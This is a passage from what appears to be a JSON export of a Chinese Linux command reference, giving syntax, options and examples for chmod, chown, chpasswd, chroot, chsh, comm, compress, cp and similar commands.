`X`符号代表如果目标文件是可执行文件或目录，可给其设置可执行权限。\n> - `s`符号代表设置权限suid和sgid，使用权限组合`u+s`设定文件的用户的ID位，`g+s`设置组用户ID位。\n> - `t`符号代表只有目录或文件的所有者才可以删除目录下的文件。\n> - `+`符号代表添加目标用户相应的权限。\n> - `-`符号代表删除目标用户相应的权限。\n> - `=`符号代表添加目标用户相应的权限，删除未提到的权限。\n\n```shell\nlinux文件的用户权限说明：\n\n# 查看当前目录（包含隐藏文件）的长格式。\nls -la\n  -rw-r--r--   1 user  staff   651 Oct 12 12:53 .gitmodules\n\n# 第1位如果是d则代表目录，是-则代表普通文件。\n# 更多详情请参阅info coreutils 'ls invocation'（ls命令的info文档）的'-l'选项部分。\n# 第2到4位代表当前用户的权限。\n# 第5到7位代表组用户的权限。\n# 第8到10位代表其他用户的权限。\n```\n\n```shell\n# 添加组用户的写权限。\nchmod g+w ./test.log\n# 删除其他用户的所有权限。\nchmod o= ./test.log\n# 使得所有用户都没有写权限。\nchmod a-w ./test.log\n# 当前用户具有所有权限，组用户有读写权限，其他用户只有读权限。\nchmod u=rwx, g=rw, o=r ./test.log\n# 等价的八进制数表示：\nchmod 754 ./test.log\n# 将目录以及目录下的文件都设置为所有用户拥有读写权限。\n# 注意，使用'-R'选项一定要保留当前用户的执行和读取权限，否则会报错！\nchmod -R a=rw ./testdir/\n# 根据其他文件的权限设置文件权限。\nchmod --reference=./1.log  ./test.log\n```\n\n### 注意\n\n1. 该命令是`GNU coreutils`包中的命令，相关的帮助信息请查看`man chmod`或`info coreutils 'chmod invocation'`。\n\n2. 符号连接的权限无法变更，如果用户对符号连接修改权限，其改变会作用在被连接的原始文件。\n\n3. 使用`-R`选项一定要保留当前用户的执行和读取权限，否则会报错！\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","chmod"]},{"title":"【Linux 命令】chown","url":"/linux-command/chown/","content":"\n用来变更文件或目录的拥有者或所属群组\n\n## 补充说明\n\n**chown命令** 改变某个文件或目录的所有者和所属的组，该命令可以向某个用户授权，使该用户变成指定文件的所有者或者改变文件所属的组。用户可以是用户或者是用户D，用户组可以是组名或组id。文件名可以使由空格分开的文件列表，在文件名中可以包含通配符。\n\n只有文件主和超级用户才可以便用该命令。\n\n###  语法\n\n```shell\nchown(选项)(参数)\n```\n\n###  选项\n\n```shell\n-c或——changes：效果类似“-v”参数，但仅回报更改的部分；\n-f或--quite或——silent：不显示错误信息；\n-h或--no-dereference：只对符号连接的文件作修改，而不更改其他任何相关文件；\n-R或——recursive：递归处理，将指定目录下的所有文件及子目录一并处理；\n-v或——version：显示指令执行过程；\n--dereference：效果和“-h”参数相同；\n--help：在线帮助；\n--reference=<参考文件或目录>：把指定文件或目录的拥有者与所属群组全部设成和参考文件或目录的拥有者与所属群组相同；\n--version：显示版本信息。\n```\n\n###  参数\n\n用户：组：指定所有者和所属工作组。当省略“：组”，仅改变文件所有者；  \n文件：指定要改变所有者和工作组的文件列表。支持多个文件和目标，支持shell通配符。\n\n###  实例\n\n将目录`/usr/meng`及其下面的所有文件、子目录的文件主改成 liu：\n\n```shell\nchown -R liu /usr/meng\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","chown"]},{"title":"【Linux 命令】chpasswd","url":"/linux-command/chpasswd/","content":"\n批量更新用户口令的工具\n\n## 补充说明\n\n**chpasswd命令** 是批量更新用户口令的工具，是把一个文件内容重新定向添加到`/etc/shadow`中。\n\n###  语法\n\n```shell\nchpasswd(选项)\n```\n\n###  选项\n\n```shell\n-e：输入的密码是加密后的密文；\n-h：显示帮助信息并退出；\n-m：当被支持的密码未被加密时，使用MD5加密代替DES加密。\n```\n\n###  实例\n\n先创建用户密码对应文件，格式为`username:password`，如`abc:abc123`，必须以这种格式来书写，并且不能有空行，保存成文本文件user.txt，然后执行chpasswd命令：\n\n```shell\nchpasswd < user.txt\n```\n\n以上是运用chpasswd命令来批量修改密码。是linux系统管理中的捷径。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","chpasswd"]},{"title":"【Linux 命令】chroot","url":"/linux-command/chroot/","content":"\n把根目录换成指定的目的目录\n\n## 补充说明\n\n**chroot命令** 用来在指定的根目录下运行指令。chroot，即 change root directory （更改 root 目录）。在 linux 系统中，系统默认的目录结构都是以`/`，即是以根 (root) 开始的。而在使用 chroot 之后，系统的目录结构将以指定的位置作为`/`位置。\n\n在经过 chroot 命令之后，系统读取到的目录和文件将不在是旧系统根下的而是新根下（即被指定的新的位置）的目录结构和文件，因此它带来的好处大致有以下3个：\n\n**增加了系统的安全性，限制了用户的权力：** \n\n在经过 chroot 之后，在新根下将访问不到旧系统的根目录结构和文件，这样就增强了系统的安全性。这个一般是在登录 (login) 前使用 chroot，以此达到用户不能访问一些特定的文件。\n\n**建立一个与原系统隔离的系统目录结构，方便用户的开发：** \n\n使用 chroot 后，系统读取的是新根下的目录和文件，这是一个与原系统根下文件不相关的目录结构。在这个新的环境中，可以用来测试软件的静态编译以及一些与系统不相关的独立开发。\n\n**切换系统的根目录位置，引导 Linux 系统启动以及急救系统等：** \n\nchroot 的作用就是切换系统的根位置，而这个作用最为明显的是在系统初始引导磁盘的处理过程中使用，从初始 RAM 磁盘 (initrd) 切换系统的根位置并执行真正的 init。另外，当系统出现一些问题时，我们也可以使用 chroot 来切换到一个临时的系统。\n\n###  语法\n\n```shell\nchroot(选项)(参数)\n```\n\n###  选项\n\n```shell\n--help：在线帮助；\n--version：显示版本信息。\n```\n\n###  参数\n\n*   目录：指定新的根目录；\n*   指令：指定要执行的指令。\n\n###  实例\n\n**将target作为根目录（运行其中的`/bin/sh`）:** \n\n```shell\nchroot target /bin/sh\n```\n\n这里,target是busybox安装好的路径，类似一个文件系统包含了许多工具。这样，将会进入一个shell界面，这个shell以target为根。运行exit退出该shell又返回原来的本机环境了，也可以使用Ctrl+D。\n\n注意：\n\n*   根用户才行\n*   如果直接chroot target默认寻找target的/bin/bash.这会以target作为根目录\n\n将target作为根目录(运行其中的`/bin/ls`):\n\n```shell\nchroot target /bin/ls\n```\n\n这里，target是busybox安装好的路径，类似一个文件系统包含了许多工具。这样运行的是target中的ls（不是本机的`/bin/ls`），然后返回立即本机的目录环境。\n\n注意，自己在本地编译一个程序生成a.out之后，拷进`target/bin/`中这样运行却不行,因为它包含了动态连接的库，需要用ldd查看a.out需要那些动态库，将这些库拷贝到新根的对应路径下才能执行。\n\n **用chroot运行自己编译的一个程序：** \n\n准备chroot的根目录：\n\n```shell\nmkdir newRoot\n```\n\n编译自己的程序：\n\n```shell\ngcc main.c\n```\n\n这里main.c生成a.out，功能是输出hello。\n\n查看程序需要的库：\n\n```shell\nldd a.out\n```\n\n输入之后，输出如下：\n\n```shell\nlinux-gate.so.1 = &gt;  (0xb8034000)\nlibc.so.6 = &gt; /lib/tls/i686/cmov/libc.so.6 (0xb7eab000)\n/lib/ld-linux.so.2 (0xb801a000)\n```\n\n将程序需要的库和程序拷贝到新根目录下：\n\n```shell\ncp a.out newRoot\nmkdir newRoot/lib\ncp /lib/tls/i686/cmov/libc.so.6 newRoot/lib\ncp /lib/ld-linux.so.2 newRoot/lib\n```\n\n这里newRoot内容将如下：\n\n```shell\na.out lib/\n```\n\n使用chroot运行自己的程序：\n\n```shell\nsu\nchroot newRoot /a.out\n```\n\n这样就能够正确运行a.out了，因为a.out使用到了其他的动态连接库，所以需要将库拷贝到newRoot中，如果没有其他库那么直接拷贝a.out就能运行。例如静态编译后的busybox，其安装目录中的`/bin/busybox`就没有依赖其他库。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","chroot"]},{"title":"【Linux 命令】chsh","url":"/linux-command/chsh/","content":"\n用来更换登录系统时使用的shell\n\n## 补充说明\n\n**chsh命令** 用来更换登录系统时使用的shell。若不指定任何参数与用户名称，则chsh会以应答的方式进行设置。\n\n###  语法\n\n```shell\nchsh(选项)(参数)\n```\n\n###  选项\n\n```shell\n-s<shell 名称>或--shell<shell 名称>：更改系统预设的shell环境。；\n-l或--list-shells：列出目前系统可用的shell清单；\n-u或--help：在线帮助；\n-v或-version：显示版本信息。\n```\n\n###  参数\n\n用户名：要改变默认shell的用户。\n\n###  实例\n\n **查看系统安装了哪些shell的两种方法：** \n\n第一种：\n\n```shell\n[rocrocket@localhost ~]$ chsh -l\n/bin/sh\n/bin/bash\n/sbin/nologin\n/bin/zsh\n```\n\n第二种：\n\n```shell\n[rocrocket@localhost ~]$ cat /etc/shells\n/bin/sh\n/bin/bash\n/sbin/nologin\n/bin/zsh\n```\n\n其实`chsh -l`也是来查看这个文件。\n\n **查看当前正在使用的shell：** \n\n```shell\n[rocrocket@localhost ~]$ echo $SHELL\n/bin/bash\n```\n\n注意SHELL一定要是大写。可以看到，目前使用的shell是`/bin/bash`\n\n **把我的shell改成zsh：** \n\n```shell\n[rocrocket@localhost ~]$ chsh -s /bin/zsh\nChanging shell for rocrocket.\nPassword:\nShell changed.\n[rocrocket@localhost ~]$\n```\n\n使用chsh加选项`-s`就可以修改登录的shell了！你会发现你现在执行`echo $SHELL`后仍然输出为`/bin/bash`，这是因为你需要重启你的shell才完全投入到zsh怀抱中去。`chsh -s`其实修改的就是`/etc/passwd`文件里和你的用户名相对应的那一行。现在来查看下：\n\n```shell\n[rocrocket@localhost ~]$ cat /etc/passwd|grep ^rocrocket\nrocrocket:x:500:500:rocrocket,China:/rocrocket/PSB/home:/bin/zsh\n```\n\n你可以发现输出内容的最后部分已经变成了`/bin/zsh`了，下次重启的时候，linux就会读取这一命令来启动shell了！\n\n **把shell修改回/bin/bash：** \n\n```shell\n[rocrocket@localhost ~]$ chsh -s /bin/bash\nChanging shell for rocrocket.\nPassword:\nShell changed.\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","chsh"]},{"title":"【Linux 命令】cksum","url":"/linux-command/cksum/","content":"\n检查文件的CRC是否正确\n\n## 补充说明\n\n**cksum命令** 是检查文件的CRC是否正确，确保文件从一个系统传输到另一个系统的过程中不被损坏。这种方法要求校验和在源系统中被计算出来，在目的系统中又被计算一次，两个数字进行比较，如果校验和相等，则该文件被认为是正确传输了。\n\n注意：CRC是指一种排错检查方法，即循环冗余校验法。\n\n指定文件交由cksum命令进行校验后，会返回校验结果供用户核对文件是否正确无误。若不指定任何文件名称或是所给予的文件名为\"-\"，则cksum命令会从标准输入设备中读取数据。\n\n###  语法\n\n```shell\ncksum(选项)(参数)\n```\n\n###  选项\n\n```shell\n--help：在线帮助；\n--version：显示版本信息。\n```\n\n###  参数\n\n文件：指定要计算校验的版本信息。\n\n###  实例\n\n使用cksum命令计算文件\"testfile1\"的完整性，输入如下命令：\n\n```shell\ncksum testfile1            #对指定文件进行CRC校验\n```\n\n以上命令执行后，将输出校验码等相关的信息，具体输出信息如下所示：\n\n```shell\n1263453430 78 testfile1     #输出信息\n```\n\n上面的输出信息中，\"1263453430\"表示校验码，\"78\"表示字节数。\n\n注意：如果文件中有任何字符被修改，都将改变计算后CRC校验码的值。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","cksum"]},{"title":"【Linux 命令】clear","url":"/linux-command/clear/","content":"\n清除当前屏幕终端上的任何信息\n\n## 补充说明\n\n**clear命令** 用于清除当前屏幕终端上的任何信息。\n\n###  语法\n\n```shell\nclear\n```\n\n###  实例\n\n直接输入clear命令当前终端上的任何信息就可被清除。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","clear"]},{"title":"【Linux 命令】clock","url":"/linux-command/clock/","content":"\n用于调整 RTC 时间\n\n## 补充说明\n\n**clock命令**用于调整 RTC 时间。 RTC 是电脑内建的硬件时间，执行这项指令可以显示现在时刻，调整硬件时钟的时间，将系统时间设成与硬件时钟之时间一致，或是把系统时间回存到硬件时钟。\n\n###  语法\n\n```shell\nclock [--adjust][--debug][--directisa][--getepoch][--hctosys][--set --date=\"<日期时间>\"]\n[--setepoch --epoch=< >][--show][--systohc][--test][--utc][--version]\n```\n\n###  选项\n\n```shell\n--adjust 　第一次使用\"--set\"或\"--systohc\"参数设置硬件时钟，会在/etc目录下产生一个名称为adjtime的文件。当再次使用这两个参数调整硬件时钟，此文件便会记录两次调整间之差异，日后执行clock指令加上\"--adjust\"参数时，程序会自动根 据记录文件的数值差异，计算出平均值，自动调整硬件时钟的时间。\n--debug 　详细显示指令执行过程，便于排错或了解程序执行的情形。\n--directisa 　告诉clock指令不要通过/dev/rtc设备文件，直接对硬件时钟进行存取。这个参数适用于仅有ISA总线结构的老式电脑。\n--getepoch 　把系统核心内的硬件时钟新时代数值，呈现到标准输出设备。\n--hctosys 　Hardware Clock to System Time，把系统时间设成和硬件时钟一致。由于这个动作将会造成系统全面更新文件的存取时间，所以最好在系统启动时就执行它。\n--set--date 　设置硬件时钟的日期和时间。\n--setepoch--epoch=<年份> 　设置系统核心之硬件时钟的新时代数值，年份以四位树字表示。\n--show 　读取硬件时钟的时间，并将其呈现至标准输出设备。\n--systohc 　System Time to Hardware Clock，将系统时间存回硬件时钟内。\n--test 　仅作测试，并不真的将时间写入硬件时钟或系统时间。\n--utc 　把硬件时钟上的时间时为CUT，有时也称为UTC或UCT。\n--version 　显示版本信息。\n```\n\n### 实例\n\n获取当前的时间\n\n```shell\nclock # 获取当前的时间\n```\n\n显示UTC时间\n\n```shell\nclock -utc #显示UTC时间\n```\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","clock"]},{"title":"【Linux 命令】clockdiff","url":"/linux-command/clockdiff/","content":"\n检测两台linux主机的时间差\n\n## 补充说明\n\n在ip报文的首部和ICMP报文的首部都可以放入时间戳数据。 **clockdiff** 程序正是使用时间戳来测算目的主机和本地主机的系统时间差。\n\n###  选项\n\n```shell\n-o：使用IP时间戳选项来测量系统时间差。时间戳只用3个。\n-o1：使用IP时间戳选项来测量系统时间差。用4个时间戳。如果-o和-o1都没有设置，那么就是用ICMP时间戳来测试系统时间差。\n```\n\n###  实例\n\n```shell\nlixi@lixi-desktop:~$ ping -T tsandaddr www.ustc.edu.cn -c 1\nPING www.ustc.edu.cn (202.38.64.9) 56(124) bytes of data.\n64 bytes from 202.38.64.9: icmp_seq=1 ttl=62 time=0.823 ms\nTS:     lixi-desktop.local (210.45.74.25)    12522473 absolute\n    210.45.74.1    -251\n    local-gw.ustc.edu.cn (202.38.64.126)    248\n    202.38.64.9    -857514\nUnrecorded hops: 3\n\n--- www.ustc.edu.cn ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss, time 0ms\nrtt min/avg/max/mdev = 0.823/0.823/0.823/0.000 ms\n```\n\n首先由上面的得出在RRT不大的时候，几个ICMP时间戳的关系。本地主机和202.38.64.9之间的时间差约为：-857514+248-251=-857517。分别用-o（IP选项中时间戳）和不带选项（ICMP路由时间戳）上述路由的系统时间进行测试。得到的结果：\n\n```shell\nlixi@lixi-desktop:~# ./clockdiff -o 202.38.64.9  \n..................................................\nhost=202.38.64.9 rtt=1(0)ms/1ms delta=-857517ms/-857517ms Wed Dec 17 11:28:30 2008\n```\n\n```shell\nlixi@lixi-desktop:~# ./clockdiff 202.38.64.9\n.\nhost=202.38.64.9 rtt=750(187)ms/0ms delta=-857517ms/-857517ms Wed Dec 17 11:28:35 2008\n```\n\n两种方法测试的都比较准确。\n\n```shell\nlixi@lixi-desktop:~#./clockdiff gigagate1.Princeton.EDU\n..................................................\nhost=gigagate1.Princeton.EDU rtt=307(21)ms/271ms delta=-5ms/-5ms Wed Dec 17 11:50:16 2008\n```\n\n上面是测试一个RTT较大的目的主机和本地主机的系统时间差。不过在使用clockdiff的时候，需要一点运气，因为很多路由会忽略ICMP或IP时间戳。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","clockdiff"]},{"title":"【Linux 命令】cmp","url":"/linux-command/cmp/","content":"\n比较两个文件是否有差异\n\n## 补充说明\n\n**cmp命令** 用来比较两个文件是否有差异。当相互比较的两个文件完全一样时，则该指令不会显示任何信息。若发现有差异，预设会标示出第一个不通之处的字符和列数编号。若不指定任何文件名称或是所给予的文件名为“-”，则cmp指令会从标准输入设备读取数据。\n\n### 语法\n\n```shell\ncmp(选项)(参数)\n```\n\n### 选项\n\n```shell\n-c或--print-chars：除了标明差异处的十进制字码之外，一并显示该字符所对应字符；\n-i<字符数目>或--ignore-initial=<字符数目>：指定一个数目；\n-l或——verbose：标示出所有不一样的地方；\n-s或--quiet或——silent：不显示错误信息；\n-v或——version：显示版本信息；\n--help：在线帮助。\n```\n\n### 参数\n\n目录：比较两个文件的差异。\n\n### 实例\n\n使用cmp命令比较文件\"testfile\"和文件\"testfile1\"两个文件，则输入下面的命令：\n\n```shell\ncmp testfile testfile1            #比较两个指定的文件\n```\n\n在上述指令执行之前，使用cat命令查看两个指定的文件内容，如下所示：\n\n```shell\ncat testfile                    #查看文件内容  \nAbsncn 50                       #显示文件“testfile”  \nAsldssja 60  \nJslkadjls 85 \n\ncat testfile1                   #查看文件内容  \nAbsncn 50                       #显示文件“testfile1”  \nAsldssjE 62  \nJslkadjls 85  \n```\n\n然后，再执行cmp命令，并返回比较结果，具体如下所示：\n\n```shell\ncmp testfile testfile1       #比较两个文件  \ntestfile testfile1           #有差异：第8字节，第2行  \n```\n\n注意：在比较结果中，只能够显示第一比较结果。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","cmp"]},{"title":"【Linux 命令】col","url":"/linux-command/col/","content":"\n过滤控制字符\n\n## 补充说明\n\n**col命令** 是一个标准输入文本过滤器，它从标注输入设备读取文本内容，并把内容显示到标注输出设备。在许多UNIX说明文件里，都有RLF控制字符。当我们运用shell特殊字符`>`和`>>`，把说明文件的内容输出成纯文本文件时，控制字符会变成乱码，col命令则能有效滤除这些控制字符。\n\n### 语法\n\n```shell\ncol(选项)\n```\n\n### 选项\n\n```shell\n-b：过滤掉所有的控制字符，包括RLF和HRLF；\n-f：滤掉RLF字符，但允许将HRLF字符呈现出来；\n-x：以多个空格字符来表示跳格字符；\n-l<缓冲区列数>：预设的内存缓冲区有128列，用户可以自行指定缓冲区的大小。\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","col"]},{"title":"【Linux 命令】colrm","url":"/linux-command/colrm/","content":"\n删除文件中的指定列\n\n## 补充说明\n\n**colrm命令** 用于删除文件中的指定列。colrm命令从标准输入设备读取书记，转而输出到标准输出设备。如果不加任何参数，则colrm命令不会过滤任何一行。\n\n###  语法\n\n```shell\ncolrm(参数)\n```\n\n###  参数\n\n*   起始列号：指定要删除的指定列；\n*   结尾列号：指定要删除的结尾列。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","colrm"]},{"title":"【Linux 命令】comm","url":"/linux-command/comm/","content":"\n按行比较两个已排序的文件。\n\n## 概要\n\n```shell\ncomm [OPTION]... FILE1 FILE2\n```\n\n## 主要用途\n\n- 按行比较两个已排序的文件。\n- 当`FILE1`或`FILE2`为`-`时，读取标准输入。\n- 无选项时输出三列，第一列为`FILE1`独有的行，第二列为`FILE2`独有的行，第三列为`FILE1`，`FILE2`共有的行。\n\n\n## 选项\n\n```shell\n-1                        不输出第一列。\n-2                        不输出第二列。\n-3                        不输出第三列。\n--check-order             检查输入行是否正确的排序，即使它们确实是已排序过的。\n--nocheck-order           不检查输入行是否正确的排序。\n--output-delimiter=STR    使用STR作为输出列之间的分隔符而不是默认的TAB。\n--total                   额外地增加第四列输出概要。\n-z, --zero-terminated     设置行终止符为NUL（空），而不是换行符。\n--help                    显示帮助信息并退出。\n--version                 显示版本信息并退出。\n```\n\n\n## 返回值\n\n返回0表示成功，返回非0值表示失败。\n\n## 例子\n\n文本 `aaa.txt` 内容\n\n```shell\n[root@localhost text]# cat aaa.txt \naaa\nbbb\nccc\nddd\neee\n111\n222\n```\n\n文本 `bbb.txt` 内容\n\n```shell\n[root@localhost text]# cat bbb.txt \nbbb\nccc\naaa\nhhh\nttt\njjj\n```\n\n\n比较结果\n\n```shell\n[root@localhost text]# comm --nocheck-order aaa.txt bbb.txt \naaa\n                bbb\n                ccc\n        aaa\nddd\neee\n111\n222\n        hhh\n        ttt\n        jjj\n```\n\n输出的第一列只包含在aaa.txt中出现的行，第二列包含在bbb.txt中出现的行，第三列包含在aaa.txt和bbb.txt中相同的行。各列之间以制表符（\\t）作为分隔符。\n\n### 比较排序过的文档\n\n先通过 sort 将文件内容排序：\n\n```shell\n[root@localhost ~]# sort aaa.txt > aaa1.txt\n[root@localhost ~]# sort bbb.txt > bbb1.txt\n```\n\n比较结果：\n\n```shell\n[root@localhost ~]# comm aaa1.txt bbb1.txt\n111\n222\n\t\taaa\n\t\tbbb\n\t\tccc\nddd\neee\n\thhh\n\tjjj\n\tttt\n```\n\n### 交集\n\n打印两个文件的交集，需要删除第一列和第二列：\n\n```shell\n[root@localhost text]# comm aaa.txt bbb.txt -1 -2\nbbb\nccc\n```\n\n### 差集\n\n通过删除不需要的列，可以得到aaa.txt和bbb.txt的差集：\n\naaa.txt的差集\n\n```shell\n[root@localhost text]# comm aaa.txt bbb.txt -2 -3\naaa\nddd\neee\n111\n222\n```\n\nbbb.txt的差集\n\n```shell\n[root@localhost text]# comm aaa.txt bbb.txt -1 -3\naaa\nhhh\nttt\njjj\n```\n\n\n### 注意\n\n1. 该命令是`GNU coreutils`包中的命令，相关的帮助信息请查看`man -s 1 comm`，`info coreutils 'comm invocation'`。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","comm"]},{"title":"【Linux 命令】command","url":"/linux-command/command/","content":"\n调用并执行指定的命令\n\n## 补充说明\n\n**command命令** 调用指定的指令并执行，命令执行时不查询shell函数。command命令只能够执行shell内部的命令。\n\n###  语法\n\n```shell\ncommand(参数)\n```\n\n###  参数\n\n指令：需要调用的指令及参数。\n\n###  实例\n\n使用command命令调用执行`echo Linux`，输入如下命令：\n\n```shell\ncommand echo Linux            #调用执行shell内部指令\n```\n\n上面的命令执行后，将调用执行命令`echo Linux`，其执行结果如下：\n\n```shell\nLinux\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","command"]},{"title":"【Linux 命令】compress","url":"/linux-command/compress/","content":"\n使用Lempress-Ziv编码压缩数据文件\n\n## 补充说明\n\n**compress命令** 使用“Lempress-Ziv”编码压缩数据文件。compress是个历史悠久的压缩程序，文件经它压缩后，其名称后面会多出\".Z\"的扩展名。当要解压缩时，可执行uncompress指令。事实上uncompress是指向compress的符号连接，因此不论是压缩或解压缩，都可通过compress指令单独完成。\n\n### 语法\n\n```shell\ncompress(选项)(参数)\n```\n\n### 选项\n\n```shell\n-f：不提示用户，强制覆盖掉目标文件；\n-c：将结果送到标准输出，无文件被改变；\n-r：递归的操作方式；\n-b<压缩效率>：压缩效率是一个介于9~16的数值，预设值为\"16\"，指定愈大的数值，压缩效率就愈高；\n-d：对文件进行解压缩而非压缩；\n-v：显示指令执行过程；\n-V：显示指令版本及程序预设值。\n```\n\n### 参数\n\n文件：指定要压缩的文件列表。\n\n### 实例\n\n将`/etc/man.config`复到`/tmp` ，并加以压缩\n\n```shell\n[root@localhost ~]# cd /tmp\n[root@localhost tmp]# cp /etc/man.config .\n[root@localhost tmp]# compress man.config\n[root@localhost tmp]# ls -l\n```\n\n```shell\n-rw-r--r-- 1 root root 2605 Jul 27 11:43 man.config.Z\n```\n\n将刚刚的压缩档解开\n\n```shell\n[root@localhost tmp]# compress -d man.config.Z\n```\n\n将 man.config 压缩成另外一个文件来备份\n\n```shell\n[root@localhost tmp]# compress -c man.config > man.config.back.Z\n[root@localhost tmp]# ll man.config*\n```\n\n```shell\n-rw-r--r-- 1 root root 4506 Jul 27 11:43 man.config\n-rw-r--r-- 1 root root 2605 Jul 27 11:46 man.config.back.Z\n```\n\n这个`-c`的选项比较有趣！会将压缩过程的资料输出到屏幕上，而不是写入成为file.Z文件。所以，我们可以透过资料流重导向的方法将资料输出成为另一个档名。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","compress"]},{"title":"【Linux 命令】consoletype","url":"/linux-command/consoletype/","content":"\n输出已连接的终端类型\n\n## 补充说明\n\n**consoletype命令** 用于打印已连接的终端类型到标准输出，并能够检查已连接的终端是当前终端还是虚拟终端。\n\n###  语法\n\n```shell\nconsoletype\n```\n\n###  实例\n\n```shell\n[root@localhost ~]# consoletype\npty\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","consoletype"]},{"title":"【Linux 命令】continue","url":"/linux-command/continue/","content":"\n结束本次循环，继续执行下一个for，while或until循环。\n\n## 概要\n\n```shell\ncontinue [n]\n```\n\n## 主要用途\n\n- 结束本次循环，继续执行下一个for，while或until循环；可指定从第几层循环继续执行。\n\n\n## 参数\n\nn（可选）：大于等于1的整数，用于指定从第几层循环继续执行。\n\n## 返回值\n\n返回状态为成功除非n小于1。\n\n## 例子\n\n```shell\n# continue的可选参数n缺省值为1。\nfor((i=3;i>0;i--)); do\n  # 跳到内层for循环继续执行。\n  for((j=3;j>0;j--)); do\n    if((j==2)); then\n      # 换成continue 1时结果一样\n      continue\n    fi\n  printf \"%s %s\\n\" ${i} ${j}\n  done\ndone\n# 输出结果\n3 3\n3 1\n2 3\n2 1\n1 3\n1 1\n```\n\n```shell\n# 当n为2时：\n# 跳到外层for循环继续执行。\nfor((i=3;i>0;i--)); do\n  for((j=3;j>0;j--)); do\n    if((j==2)); then\n      continue 2\n    fi\n  printf \"%s %s\\n\" ${i} ${j}\n  done\ndone\n# 输出结果\n3 3\n2 3\n1 3\n```\n\n### 注意\n\n1. 该命令是bash内建命令，相关的帮助信息请查看`help`命令。\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","continue"]},{"title":"【Linux 命令】convertquota","url":"/linux-command/convertquota/","content":"\n把老的配额文件转换为新的格式\n\n## 补充说明\n\n**convertquota命令** 用于将老的磁盘额数据文件（“quota.user”和“quota.group”）转换为新格式的文件（“quota.user”和“quota.group”）。\n\n###  语法\n\n```shell\nconvertquota(选项)(参数)\n```\n\n###  选项\n\n```shell\n-u：仅转换用户磁盘配额数据文件；\n-g：仅转换组磁盘配额数据文件；\n-f：将老的磁盘配额文件转换为新的格式；\n-e：将新的文件格式从大字节序换为小字节序。\n```\n\n###  参数\n\n文件系统：指定要转换磁盘配额数据文件格式的文件系统（硬盘分区）。\n\n###  实例\n\n使用convertquota指令转换指定文件系统`/data`的磁盘配额数据文件。在命令行中输入下面的命令：\n\n```shell\nconvertquota -u /data     //转换文件系统\"/data\"上的用户磁盘配额文件\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","convertquota"]},{"title":"【Linux 命令】cp","url":"/linux-command/cp/","content":"\n将源文件或目录复制到目标文件或目录中\n\n## 补充说明\n\n**cp命令** 用来将一个或多个源文件或者目录复制到指定的目的文件或目录。它可以将单个源文件复制成一个指定文件名的具体的文件或一个已经存在的目录下。cp命令还支持同时复制多个文件，当一次复制多个文件时，目标文件参数必须是一个已经存在的目录，否则将出现错误。\n\n###  语法 \n\n```shell\ncp(选项)(参数)\n```\n\n###  选项 \n\n```shell\n-a：此参数的效果和同时指定\"-dpR\"参数相同；\n-d：当复制符号连接时，把目标文件或目录也建立为符号连接，并指向与源文件或目录连接的原始文件或目录；\n-f：强行复制文件或目录，不论目标文件或目录是否已存在；\n-i：覆盖既有文件之前先询问用户；\n-l：对源文件建立硬连接，而非复制文件；\n-p：保留源文件或目录的属性；\n-R/r：递归处理，将指定目录下的所有文件与子目录一并处理；\n-s：对源文件建立符号连接，而非复制文件；\n-u：使用这项参数后只会在源文件的更改时间较目标文件更新时或是名称相互对应的目标文件并不存在时，才复制文件；\n-S：在备份文件时，用指定的后缀“SUFFIX”代替文件的默认后缀；\n-b：覆盖已存在的文件目标前将目标文件备份；\n-v：详细显示命令执行的操作。\n```\n\n###  参数 \n\n*   源文件：制定源文件列表。默认情况下，cp命令不能复制目录，如果要复制目录，则必须使用`-R`选项；\n*   目标文件：指定目标文件。当“源文件”为多个文件时，要求“目标文件”为指定的目录。\n\n###  实例 \n\n下面的第一行中是 cp 命令和具体的参数（-r 是“递归”， -u 是“更新”，-v 是“详细”）。接下来的三行显示被复制文件的信息，最后一行显示命令行提示符。这样，只拷贝新的文件到我的存储设备上，我就使用 cp 的“更新”和“详细”选项。\n\n通常来说，参数 `-r` 也可用更详细的风格 `--recursive`。但是以简短的方式，也可以这么连用 `-ruv`。\n\n```shell\ncp -r -u -v /usr/men/tmp ~/men/tmp\n```\n\n版本备份 `--backup=numbered` 参数意思为“我要做个备份，而且是带编号的连续备份”。所以一个备份就是 1 号，第二个就是 2 号，等等。\n\n```shell\n$ cp --force --backup=numbered test1.py test1.py\n$ ls\ntest1.py test1.py.~1~ test1.py.~2~\n```\n\n如果把一个文件复制到一个目标文件中，而目标文件已经存在，那么，该目标文件的内容将被破坏。此命令中所有参数既可以是绝对路径名，也可以是相对路径名。通常会用到点`.`或点点`..`的形式。例如，下面的命令将指定文件复制到当前目录下：\n\n```shell\ncp ../mary/homework/assign .\n```\n\n所有目标文件指定的目录必须是己经存在的，cp命令不能创建目录。如果没有文件复制的权限，则系统会显示出错信息。\n\n将文件file复制到目录`/usr/men/tmp`下，并改名为file1\n\n```shell\ncp file /usr/men/tmp/file1\n```\n\n将目录`/usr/men`下的所有文件及其子目录复制到目录`/usr/zh`中\n\n```shell\ncp -r /usr/men /usr/zh\n```\n\n交互式地将目录`/usr/men`中的以m打头的所有.c文件复制到目录`/usr/zh`中\n\n```shell\ncp -i /usr/men m*.c 